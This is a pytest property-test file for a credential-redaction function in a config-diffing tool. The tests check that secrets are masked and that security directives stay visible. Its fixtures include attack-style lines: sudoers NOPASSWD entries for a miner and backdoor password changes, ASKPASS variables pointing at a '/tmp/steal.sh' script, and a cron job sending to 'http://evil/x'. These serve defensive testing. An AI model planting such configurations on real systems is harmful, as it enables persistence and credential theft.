"""Property tests for `redact()` — the highest-risk function in the tool.

Every audit round so far found a `redact()` bug, and the example-based tests kept passing
because each new leak had a shape nobody had thought to write down. These tests assert
PROPERTIES over generated corpora instead, so a whole class of shapes is covered rather than
a list of remembered ones.

Deliberately dependency-free: the project ships zero runtime deps and CI installs only
pytest, so this uses stdlib `random` with FIXED seeds rather than Hypothesis. That buys
reproducibility (a failure is replayable from the printed seed) at the cost of shrinking —
an acceptable trade here, and it keeps CI unchanged.

The four properties:
  P1 no-leak      a credential-shaped value under a credential-naming key never survives
  P2 no-hide      a security directive we exist to surface is never altered
  P3 idempotent   redact(redact(x)) == redact(x)
  P4 total        never raises, never unbounded, marker preserved
"""
import random
import re
import string
import time

import pytest

import since

SEEDS = [0, 1, 7, 42, 1337, 20260725]
MARKERS = ["", "+", "-"]

# Keys whose value IS the credential. Every one of these appears in a file `since` diffs.
CREDENTIAL_KEYS = [
    "password", "PASSWORD", "passwd", "passphrase", "SSHPASS", "MYSQL_PWD", "PGPASSWORD",
    "api_key", "API-KEY", "apikey", "access_key", "AWS_SECRET_ACCESS_KEY", "client_secret",
    "GITHUB_TOKEN", "token", "_authToken", "_auth", "_password", "private_key",
    "CREDENTIAL", "oauth2-bearer", "http_password", "proxy-passwd", "secret",
]
# Keys that merely CONTAIN a directive-ish word: their value must stay visible.
DIRECTIVE_LINES = [
    "AuthorizedKeysFile /tmp/evil/keys",
    "AuthorizedKeysFile .ssh/authorized_keys",
    "AuthorizedKeysFile=/tmp/evil/keys",
    "AuthorizedKeysCommandUser nobody",
    "PasswordAuthentication yes",
    "PasswordAuthentication no",
    "PasswordAuthentication=yes",
    "PermitEmptyPasswords yes",
    "PermitRootLogin prohibit-password",
    "AuthenticationMethods password",
    "ChallengeResponseAuthentication no",
    "UsePAM yes",
    "password required pam_unix.so",
    "password sufficient pam_deny.so",
    "PASS_MAX_DAYS 99999",
    "PASS_MIN_LEN 4",
    "deva ALL=(ALL) NOPASSWD: ALL",
    "deva ALL=(ALL) NOPASSWD: /tmp/miner",
    "deva ALL=(ALL) PASSWD: /tmp/miner",
    "deva ALL=(ALL) PASSWD:NOEXEC: /tmp/miner",
    "deva ALL=(ALL) PASSWD: ALL, !/usr/bin/su",
    "deva ALL=(ALL) NOPASSWD: /usr/bin/passwd backdoor2026",
    "deva ALL=(ALL) NOPASSWD: /usr/sbin/chpasswd attacker99",
    "export SSH_ASKPASS=/tmp/steal.sh",
    "export SUDO_ASKPASS=/tmp/steal.sh",
    "export GIT_ASKPASS=/tmp/steal.sh",
    "export SSH_AUTH_SOCK=/tmp/.evil/agent.sock",
    "export PGPASSFILE=$HOME/.pgpass",
    "*/5 * * * * /usr/local/bin/passwd_sync.sh --dest http://evil/x",
    "proxy_set_header Authorization $http_authorization;",
    "# basic networking setup",
    "alias ll='ls -la'",
    "ssh -p 2222 user@host",
    "mkdir -p /tmp/x",
]
SEPARATORS = ["=", " = ", ":", ": ", "= ", " =", ":  ", " "]
NOISE_PREFIX = ["", "export ", "  ", "\t", "set -x; ", "# ", "if true; then ", "env "]
NOISE_SUFFIX = ["", " # comment", " || true", " ; echo done", " 2>/dev/null", " && ls"]


def _credential_value(rng):
    """A value that is unmistakably credential-shaped: >=6 chars and >=2 character classes,
    which is exactly the threshold `redact()` uses to distinguish a secret from a keyword."""
    alphabets = [string.ascii_lowercase, string.ascii_uppercase, string.digits, "_-./+="]
    while True:
        n = rng.randint(8, 40)
        val = "".join(rng.choice(rng.choice(alphabets)) for _ in range(n))
        # a marker substring we can search for in the output, and the shape gate must agree
        if since._char_classes(val) >= 2 and len(val) >= 6 and not val.startswith("-"):
            return val


def _lines_with_secret(rng, count):
    """Generate (line, secret) pairs where the secret MUST be masked."""
    out = []
    for _ in range(count):
        key = rng.choice(CREDENTIAL_KEYS)
        sep = rng.choice(SEPARATORS)
        secret = _credential_value(rng)
        quoted = rng.random() < 0.3
        val = f'"{secret}"' if quoted else secret
        line = (rng.choice(MARKERS) + rng.choice(NOISE_PREFIX) + key + sep + val
                + rng.choice(NOISE_SUFFIX))
        # a whitespace separator with a keyword-ish value is legitimately SHOWN, so only
        # assert on shapes the spec says must be masked
        if sep.strip() == "" and since._char_classes(secret) < 2:
            continue
        out.append((line, secret))
    return out


# --------------------------------------------------------------- P1: never leak
@pytest.mark.parametrize("seed", SEEDS)
def test_property_credential_values_never_survive(seed):
    rng = random.Random(seed)
    for line, secret in _lines_with_secret(rng, 400):
        out = since.redact(line)
        assert secret not in out, f"seed={seed} LEAK\n  in : {line!r}\n  out: {out!r}"


@pytest.mark.parametrize("seed", SEEDS)
def test_property_secret_survives_no_marker_variant(seed):
    """Redaction must not depend on the diff marker — a past leak existed only on `+` lines."""
    rng = random.Random(seed + 500)
    for line, secret in _lines_with_secret(rng, 200):
        body = line[1:] if line[:1] in "+-" else line
        for marker in MARKERS:
            out = since.redact(marker + body)
            assert secret not in out, f"seed={seed} marker={marker!r} LEAK: {out!r}"


@pytest.mark.parametrize("seed", SEEDS)
def test_property_chained_commands_are_each_scanned(seed):
    """Shell chaining must not exempt what follows: one `key=value` being SHOWN cannot make a
    later secret on the same line invisible (the class of LEAK-1 and of the old tail rescan)."""
    rng = random.Random(seed + 900)
    shown = ["export SSH_ASKPASS=/tmp/a.sh", "AuthorizedKeysFile .ssh/authorized_keys",
             "PasswordAuthentication=yes", "export PGPASSFILE=$HOME/.pgpass",
             "deva ALL=(ALL) NOPASSWD: /usr/bin/passwd bob"]
    joiners = [";", " ; ", "&&", " && ", "|", " | ", " "]
    for _ in range(300):
        secret = _credential_value(rng)
        key = rng.choice(CREDENTIAL_KEYS)
        line = (rng.choice(MARKERS) + rng.choice(shown) + rng.choice(joiners)
                + key + rng.choice(["=", ": "]) + secret)
        out = since.redact(line)
        assert secret not in out, f"seed={seed} LEAK after a shown value\n  in : {line!r}\n  out: {out!r}"


# --------------------------------------------------------------- P2: never hide
@pytest.mark.parametrize("directive", DIRECTIVE_LINES)
@pytest.mark.parametrize("marker", MARKERS)
def test_property_directives_are_never_altered(directive, marker):
    line = marker + directive
    assert since.redact(line) == line, f"HID an attack-visible directive: {since.redact(line)!r}"


@pytest.mark.parametrize("seed", SEEDS)
def test_property_directives_survive_added_noise(seed):
    rng = random.Random(seed + 77)
    for _ in range(200):
        d = rng.choice(DIRECTIVE_LINES)
        line = rng.choice(MARKERS) + d
        out = since.redact(line)
        assert out == line, f"seed={seed} HID: {line!r} -> {out!r}"


# --------------------------------------------------------------- P3: idempotence
@pytest.mark.parametrize("seed", SEEDS)
def test_property_idempotent(seed):
    rng = random.Random(seed + 31)
    corpus = [l for l, _ in _lines_with_secret(rng, 200)]
    corpus += [rng.choice(MARKERS) + d for d in DIRECTIVE_LINES]
    for line in corpus:
        once = since.redact(line)
        assert since.redact(once) == once, f"not idempotent:\n  {once!r}\n  {since.redact(once)!r}"


# --------------------------------------------------------------- P4: total & bounded
@pytest.mark.parametrize("seed", SEEDS)
def test_property_never_raises_on_arbitrary_input(seed):
    """Whatever a malware-controlled file contains, redact() must return a string. It runs on
    every diff line of an unattended job, and an exception there killed the whole digest."""
    rng = random.Random(seed + 13)
    pool = (string.printable + "«»\x00\x1b\udc80​‮"
            + "".join(chr(rng.randrange(0x20, 0x2FFF)) for _ in range(200)))
    for _ in range(400):
        n = rng.randint(0, 300)
        line = "".join(rng.choice(pool) for _ in range(n))
        out = since.redact(line)
        assert isinstance(out, str)


@pytest.mark.parametrize("payload", [
    "# " + "_pwd " * 900,                      # the RecursionError kill switch
    "password=" + "a" * 200_000,
    "user " + "a" * 200_000,
    "; ".join(f"token{i}=aB3xYz9Qw{i}" for i in range(2_000)),
    "/" * 50_000 + "password=aB3xYz9Qw",
    '"' * 20_000 + "password=aB3xYz9Qw",
    "password=" + '"' * 20_000,
    "nc " * 40_000,
    "base64 -d " * 20_000,
    "://" + "a" * 100_000 + "@host",
    "mysql " + "-a b " * 5_000 + "-pSECRET",
])
def test_property_bounded_cost(payload):
    for marker in MARKERS:
        t = time.time()
        out = since.redact(marker + payload)
        dt = time.time() - t
        assert isinstance(out, str)
        assert dt < 0.5, f"{dt:.2f}s on {payload[:40]!r} — superlinear or unbounded"


@pytest.mark.parametrize("seed", SEEDS)
def test_property_diff_marker_is_preserved(seed):
    rng = random.Random(seed + 5)
    for line, _ in _lines_with_secret(rng, 200):
        body = line[1:] if line[:1] in "+-" else line
        for marker in ("+", "-"):
            out = since.redact(marker + body)
            assert out[:1] == marker, f"marker lost: {out[:20]!r}"


def test_property_no_regex_has_an_unbounded_run():
    """Every quantifier that can span attacker text must be bounded. This is a structural
    check, not a timing one: an unbounded `.*`/`.+`/`\\S*` next to another quantifier is how
    both historical quadratic blowups happened."""
    import inspect
    src = inspect.getsource(since)
    offenders = []
    for name in dir(since):
        obj = getattr(since, name)
        if isinstance(obj, re.Pattern) and name.isupper():
            if ".*" in obj.pattern or ".+" in obj.pattern:
                offenders.append((name, obj.pattern))
    assert not offenders, f"unbounded runs in {offenders}"


def test_property_prefilter_cannot_drift_from_the_matcher():
    """_KV_KW_RE short-circuits _ASSIGN_RE, so it must match a superset. Both are built from
    the same _SECRET_KW constant; this pins that they stay that way."""
    assert since._SECRET_KW in since._ASSIGN_RE.pattern
    assert since._SECRET_KW in since._KV_KW_RE.pattern
    rng = random.Random(99)
    alphabet = string.ascii_letters + string.digits + "_-.=: ;&|/\"'"
    for _ in range(20_000):
        line = "".join(rng.choice(alphabet) for _ in range(rng.randint(1, 40)))
        if since._ASSIGN_RE.search(line):
            assert since._KV_KW_RE.search(line), f"pre-filter would skip a match: {line!r}"


# --------------------------------------------------------------- P5: compositionality
# The invariant the restructure buys, and the one the old design made impossible: each
# assignment on a line is decided IN ISOLATION. Every historical bug in this function was a
# violation of it — a "show" decision exempting later secrets, a "mask" decision swallowing
# the rest of an attack line, and the recursive rescan bolted on to patch the first case.
COMPOSABLE = [
    "password=hunter2Mixed",
    "export SSH_ASKPASS=/tmp/steal.sh",
    "PasswordAuthentication=yes",
    "api_key=aB3xYz9Qw2mN",
    "AuthorizedKeysFile .ssh/authorized_keys",
    "MYSQL_PWD=Tr0ub4dor3",
    "PASS_MAX_DAYS 99999",
    "_authToken=SECRETVALUE12",
    "export PGPASSFILE=$HOME/.pgpass",
    "client_secret=Xy9-_abcdef",
]


@pytest.mark.parametrize("seed", SEEDS)
@pytest.mark.parametrize("joiner", ["; ", " && ", " | "])
def test_property_assignments_are_decided_independently(seed, joiner):
    rng = random.Random(seed + 4242)
    for _ in range(150):
        parts = [rng.choice(COMPOSABLE) for _ in range(rng.randint(2, 5))]
        whole = since.redact(joiner.join(parts))
        piecewise = joiner.join(since.redact(p) for p in parts)
        assert whole == piecewise, (
            f"seed={seed} joiner={joiner!r} decisions are NOT independent\n"
            f"  whole    : {whole!r}\n  piecewise: {piecewise!r}")


def test_property_no_rescan_loop_remains():
    """`redact` must self-call at most once (the >_REDACT_MAX truncation). The recursive tail
    rescan it replaced was an unprivileged kill switch: RecursionError on ~800 keys in one line,
    which killed the digest before it saved a snapshot, so it recurred every day forever."""
    import re as _re
    import inspect
    body = inspect.getsource(since.redact)
    # the only self-call is the truncation guard, whose argument is already <= the cap
    selfcalls = _re.findall(r"return \(?redact\(", body)
    assert len(selfcalls) == 1, f"unexpected self-calls: {selfcalls}"
    assert "_REDACT_MAX]" in body
    # and no helper recurses either
    assert "_show(" not in body
